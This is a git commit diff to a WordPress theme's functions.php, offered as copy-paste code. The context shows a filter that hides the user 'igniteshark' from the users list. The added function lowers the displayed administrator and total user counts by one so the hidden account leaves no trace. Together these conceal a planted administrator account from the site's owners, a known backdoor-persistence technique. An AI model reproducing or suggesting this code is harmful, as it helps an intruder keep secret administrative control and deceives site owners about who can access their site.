f68daad5a4805086edc1c01d160c5aa44ec4aa93
Pradeep Singh <74428111+Pradeepsingh143@users.noreply.github.com>
2023-09-16 06:30:50 +0530

    Show number of admins minus 1
    Show number of admins minus 1 add it in function.php 
    Copy this code into your theme’s functions.php file. You can find your theme’s functions.php file in folder /wp-content/themes/your(sub)theme/ on your site’s server.

--- function.php
+++ function.php
@@ -13,3 +13,17 @@ function site_pre_user_query($user_search) {
       "WHERE 1=1 AND {$wpdb->users}.user_login != 'igniteshark'",$user_search->query_where);
   }
 }
+
+
+//* Show number of admins minus 1
+add_filter("views_users", "site_list_table_views");
+function site_list_table_views($views){
+   $users = count_users();
+   $admins_num = $users['avail_roles']['administrator'] - 1;
+   $all_num = $users['total_users'] - 1;
+   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
+   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
+   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
+   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
+   return $views;
+}
